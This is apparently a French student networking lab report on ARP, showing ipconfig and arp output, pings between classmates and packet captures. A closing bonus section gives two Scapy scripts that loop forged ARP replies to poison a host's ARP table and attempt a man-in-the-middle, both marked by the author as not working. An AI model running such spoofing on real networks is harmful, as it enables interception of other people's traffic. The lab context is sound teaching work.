# TP3 : 32°13'34"N 95°03'27"W

## Sommaire

# 0. Prérequis

# I. ARP basics

☀️ **Avant de continuer...** 

```Powershell
PS C:\Windows\system32> ipconfig /all
[...]
Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : Realtek 8821CE Wireless LAN 802.11ac PCI-E NIC
   ☀️ Adresse physique . . . . . . . . . . . : A8-41-F4-EA-29-B5
   DHCP activé. . . . . . . . . . . . . . : Non
   Configuration automatique activée. . . : Oui
   Adresse IPv6 de liaison locale. . . . .: fe80::28cf:3eed:aab4:8bf7%11(préféré)
   Adresse IPv4. . . . . . . . . . . . . .: 10.8.8.1(préféré)
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Adresse IPv4. . . . . . . . . . . . . .: 10.33.76.43(préféré)
   Masque de sous-réseau. . . . . . . . . : 255.255.240.0
   Passerelle par défaut. . . . . . . . . : 10.33.79.254
   IAID DHCPv6 . . . . . . . . . . . : 111690228
   DUID de client DHCPv6. . . . . . . . : 00-01-00-01-2D-DA-E5-26-00-DE-AB-CA-AB-72
   Serveurs DNS. . .  . . . . . . . . . . : 8.8.8.8
                                       1.1.1.1
   NetBIOS sur Tcpip. . . . . . . . . . . : Activé

```

☀️ **Affichez votre table ARP**


☀️
```Powershell
PS C:\Windows\system32> arp -a

Interface : 10.8.8.1 --- 0xb
  Adresse Internet      Adresse physique      Type
  10.8.8.255            ff-ff-ff-ff-ff-ff     statique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique

Interface : 192.168.56.1 --- 0x13
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```

☀️ **Déterminez l'adresse MAC de la passerelle du réseau de l'école**


```
PS C:\Windows\system32> arp -a

Interface : 10.8.8.1 --- 0xb
  Adresse Internet      Adresse physique      Type
  10.8.8.255            ff-ff-ff-ff-ff-ff     statique
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamique ☀️ 
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
[...]
```

☀️ **Supprimez la ligne qui concerne la passerelle**

```ps
PS C:\Windows\system32> arp -d 10.33.79.254 ☀️
```


☀️ **Prouvez que vous avez supprimé la ligne dans la table ARP**

```
PS C:\Windows\system32> arp -a ☀️

Interface : 192.168.56.1 --- 0x13
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  224.0.0.251           01-00-5e-00-00-fb     statique
  224.0.0.252           01-00-5e-00-00-fc     statique
  230.0.0.1             01-00-5e-00-00-01     statique
  239.242.6.7           01-00-5e-72-06-07     statique
  239.255.132.178       01-00-5e-7f-84-b2     statique
  239.255.255.250       01-00-5e-7f-ff-fa     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```

☀️ **Wireshark**

☀️
[arp1](./arp1.pcap)

# II. ARP dans un réseau local


## 1. Basics

☀️ **Déterminer**

- pour la carte réseau impliquée dans le partage de connexion (carte WiFi ?)
- son adresse IP au sein du réseau local formé par le partage de co


```ps
PS C:\Windows\system32> arp -a

Interface : 192.168.28.165 --- 0xb
  Adresse Internet      Adresse physique      Type
  ☀️192.168.28.249        6a-b2-90-ea-ae-be     dynamique
```

- son adresse MAC


```ps
PS C:\Windows\system32> arp -a

Interface : 192.168.28.165 --- 0xb
  Adresse Internet      Adresse physique      Type
  192.168.28.249        ☀️6a-b2-90-ea-ae-be     dynamique
```



☀️ **DIY**

```ps
PS C:\Windows\system32> ipconfig /all
[...]

Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Description. . . . . . . . . . . . . . : Realtek 8821CE Wireless LAN 802.11ac PCI-E NIC
   Adresse physique . . . . . . . . . . . : A8-41-F4-EA-29-B5
   DHCP activé. . . . . . . . . . . . . . : Non
   Configuration automatique activée. . . : Oui
   Adresse IPv6 de liaison locale. . . . .: fe80::28cf:3eed:aab4:8bf7%11(préféré)
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.28.33(préféré) ☀️
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . . . . : 192.168.28.249
   IAID DHCPv6 . . . . . . . . . . . : 111690228
   DUID de client DHCPv6. . . . . . . . : 00-01-00-01-2D-DA-E5-26-00-DE-AB-CA-AB-72
   Serveurs DNS. . .  . . . . . . . . . . : 8.8.8.8
   NetBIOS sur Tcpip. . . . . . . . . . . : Activé
```

☀️ **Pingz !**

Adrien :
```ps
PS C:\Windows\system32> ping 192.168.28.69

Envoi d’une requête 'Ping'  192.168.28.69 avec 32 octets de données :
Réponse de 192.168.28.69 : octets=32 temps=63 ms TTL=128
Réponse de 192.168.28.69 : octets=32 temps=9 ms TTL=128
Réponse de 192.168.28.69 : octets=32 temps=10 ms TTL=128
Réponse de 192.168.28.69 : octets=32 temps=114 ms TTL=128

Statistiques Ping pour 192.168.28.69:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 9ms, Maximum = 114ms, Moyenne = 49ms
```

Anthony :
```ps
PS C:\Windows\system32> ping 192.168.28.1

Envoi d’une requête 'Ping'  192.168.28.1 avec 32 octets de données :
Réponse de 192.168.28.1 : octets=32 temps=314 ms TTL=128
Réponse de 192.168.28.1 : octets=32 temps=21 ms TTL=128
Réponse de 192.168.28.1 : octets=32 temps=20 ms TTL=128
Réponse de 192.168.28.1 : octets=32 temps=9 ms TTL=128

Statistiques Ping pour 192.168.28.1:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 9ms, Maximum = 314ms, Moyenne = 91ms
```

Baptiste :

```ps
PS C:\Windows\system32> ping 192.168.28.66

Envoi d’une requête 'Ping'  192.168.28.66 avec 32 octets de données :
Réponse de 192.168.28.66 : octets=32 temps=12 ms TTL=128
Réponse de 192.168.28.66 : octets=32 temps=125 ms TTL=128
Réponse de 192.168.28.66 : octets=32 temps=56 ms TTL=128
Réponse de 192.168.28.66 : octets=32 temps=57 ms TTL=128

Statistiques Ping pour 192.168.28.66:
    Paquets : envoyés = 4, reçus = 4, perdus = 0 (perte 0%),
Durée approximative des boucles en millisecondes :
    Minimum = 12ms, Maximum = 125ms, Moyenne = 62ms
```

## 2. ARP

☀️ **Affichez votre table ARP !**

```ps
PS C:\Windows\system32> arp -a

Interface : 192.168.28.33 --- 0xb
  Adresse Internet      Adresse physique      Type
  ☀️192.168.28.1          d0-65-78-a2-a1-20     dynamique
  ☀️192.168.28.66         3a-8b-bb-d2-40-03     dynamique
  ☀️192.168.28.69         58-96-71-9c-c7-6e     dynamique
  192.168.28.249        6a-b2-90-ea-ae-be     dynamique
  192.168.28.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.2             01-00-5e-00-00-02     statique
  224.0.0.22            01-00-5e-00-00-16     statique

Interface : 192.168.56.1 --- 0x13
  Adresse Internet      Adresse physique      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     statique
  224.0.0.22            01-00-5e-00-00-16     statique
  255.255.255.255       ff-ff-ff-ff-ff-ff     statique
```

☀️ **Capture arp2.pcap**


☀️[arp2](./arp2.pcap)




















## 3. Bonus : ARP poisoning


⭐ **Empoisonner la table ARP de l'un des membres de votre réseau**

Grace a un fichier python suivant :

```py
from scapy.all import *

trame = Ether(type=0x0806)

packet = ARP()
packet.hwlen = 6
packet.plen = 4
packet.op = 2
packet.psrc = '192.168.56.105'
packet.pdst = '192.168.56.1'
packet.hwsrc = '08:00:27:3b:bf:9d'
packet.hwdst = '08:00:27:29:fc:9e'

total = trame / packet
total.show()



while True:
        sendp(total)

```

Pas fonctionel...

⭐ **Mettre en place un MITM**

```py
from scapy.all import *

trame = Ether(type=0x0806)

packet = ARP()
packet.hwlen = 6
packet.plen = 4
packet.op = 2
packet.psrc = '192.168.56.105'
packet.pdst = '192.168.56.1'
packet.hwsrc = '08:00:27:3b:bf:9d'
packet.hwdst = '08:00:27:29:fc:9e'

total = trame / packet
total.show()




trame2 = Ether(type=0x0806)

packet2 = ARP()
packet2.hwlen = 6
packet2.plen = 4
packet2.op = 2
packet2.psrc = '192.168.56.105'
packet2.pdst = '192.168.56.106'
packet2.hwsrc = '08:00:27:3b:bf:9d'
packet2.hwdst = '52:54:00:12:35:02'

total2 = trame / packet
total2.show()



while True:
        sendp(total)
        sendp(total2)

```

Pas fonctionel...

